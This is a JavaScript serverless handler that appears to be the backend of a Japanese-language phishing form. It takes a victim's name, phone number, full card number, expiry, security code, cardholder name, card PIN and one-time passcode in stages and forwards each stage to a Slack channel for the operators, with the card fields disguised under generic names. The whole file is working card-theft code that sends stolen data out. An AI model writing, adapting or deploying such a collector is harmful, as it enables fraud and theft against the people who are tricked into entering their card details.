export default async function handler(req, res) {
  // CORS headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const SLACK_BOT_TOKEN = process.env.SLACK_BOT_TOKEN;
  const SLACK_CHANNEL_ID = process.env.SLACK_CHANNEL_ID;

  if (!SLACK_BOT_TOKEN || !SLACK_CHANNEL_ID) {
    console.error(
      "Missing SLACK_BOT_TOKEN or SLACK_CHANNEL_ID environment variables",
    );
    return res.status(500).json({ error: "Server configuration error" });
  }

  const { phase, data, threadTs } = req.body;

  // Build message based on phase
  let message = "";
  const timestamp = new Date().toLocaleString("ja-JP", {
    timeZone: "Asia/Tokyo",
  });

  const mention = "<@U0800E903G8>";

  if (phase === 1) {
    message = [
      `${mention} :memo: *新規回答がありました*`,
      "",
      `*氏名:* ${data.name}`,
      `*電話番号:* ${data.phone}`,
      "",
      `_受付日時: ${timestamp}_`,
    ].join("\n");
  } else if (phase === 2) {
    message = [
      `${mention} :credit_card: *STEP 2 完了: カードブランド選択*`,
      "",
      `*カードブランド:* ${data.cardBrand}`,
      "",
      `_入力日時: ${timestamp}_`,
    ].join("\n");
  } else if (phase === 3) {
    message = [
      `${mention} :credit_card: *STEP 3 完了: カード情報入力*`,
      "",
      `*カード番号:* ${data.itemA}`,
      `*有効期限（MM）:* ${data.itemB}`,
      `*有効期限（YY）:* ${data.itemC}`,
      `*セキュリティコード:* ${data.itemD}`,
      `*名義人:* ${data.itemE}`,
      "",
      `_入力日時: ${timestamp}_`,
    ].join("\n");
  } else if (phase === 4) {
    message = [
      `${mention} :clipboard: *STEP 4 完了: 暗証番号入力*`,
      "",
      `*暗証番号:* ${data.itemF}`,
      "",
      `_入力日時: ${timestamp}_`,
    ].join("\n");
  } else if (phase === 5) {
    message = [
      `${mention} :white_check_mark: *STEP 5 完了: 全入力完了*`,
      "",
      `*ワンタイムパスコード:* ${data.itemG}`,
      "",
      "---",
      "*【入力内容まとめ】*",
      `*氏名:* ${data.name}`,
      `*電話番号:* ${data.phone}`,
      `*カードブランド:* ${data.cardBrand}`,
      `*カード番号:* ${data.itemA}`,
      `*有効期限（MM）:* ${data.itemB}`,
      `*有効期限（YY）:* ${data.itemC}`,
      `*セキュリティコード:* ${data.itemD}`,
      `*名義人:* ${data.itemE}`,
      `*暗証番号:* ${data.itemF}`,
      `*ワンタイムパスコード:* ${data.itemG}`,
      "",
      `_完了日時: ${timestamp}_`,
    ].join("\n");
  }

  // Build Slack API payload
  const payload = {
    channel: SLACK_CHANNEL_ID,
    text: message,
    mrkdwn: true,
  };

  // Phase 2+ → reply in thread
  if (phase > 1 && threadTs) {
    payload.thread_ts = threadTs;
  }

  try {
    const slackRes = await fetch("https://slack.com/api/chat.postMessage", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${SLACK_BOT_TOKEN}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    const slackData = await slackRes.json();

    if (!slackData.ok) {
      console.error("Slack API error:", slackData.error);
      return res.status(500).json({ error: slackData.error });
    }

    // Return thread_ts for Phase 1 (so subsequent phases can reply in thread)
    const responseData = { ok: true };
    if (phase === 1) {
      responseData.threadTs = slackData.ts;
    }

    return res.status(200).json(responseData);
  } catch (err) {
    console.error("Slack request failed:", err);
    return res.status(500).json({ error: "Failed to send Slack notification" });
  }
}
